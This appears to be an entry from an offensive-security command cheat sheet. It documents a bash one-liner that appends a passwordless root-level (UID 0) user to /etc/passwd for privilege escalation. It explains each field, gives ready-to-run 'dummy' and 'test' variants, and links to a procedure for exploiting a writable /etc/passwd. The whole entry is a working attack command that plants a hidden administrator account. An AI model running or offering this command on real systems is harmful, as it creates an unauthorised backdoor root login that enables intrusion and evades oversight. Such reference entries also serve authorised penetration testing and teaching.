---
type: command
executor: bash
data: 'echo ''$_USERNAME::0:0:$_USERNAME:/root:/bin/bash'' >> /etc/passwd'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - privesc
  - account-creation
verified: true
validated: true
---

# add-dummy-user-to-etc-passwd

## Command

```bash
echo '$_USERNAME::0:0:$_USERNAME:/root:/bin/bash' >> /etc/passwd
```

## Description

Adds a passwordless root user to /etc/passwd for quick privilege escalation without needing a hash.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_USERNAME | New username (e.g., 'dummy') | Yes |
| :: | Empty password field | Yes |
| 0:0 | UID/GID for root | Yes |
| /root:/bin/bash | Home and shell | Yes |
| >> /etc/passwd | Append to file | Yes |

## Examples

### Basic Usage

```bash
echo 'dummy::0:0:dummy:/root:/bin/bash' >> /etc/passwd
```

### Advanced Usage

```bash
echo 'test::0:0:Test:/tmp:/bin/sh' >> /etc/passwd
```

## Expected Output

No output; verify with [[commands/view-etc-passwd]].

## Related

- [[procedures/Linux-Privilege-Escalation-via-Writable-etc-passwd]]
- [[commands/su-to-user]]
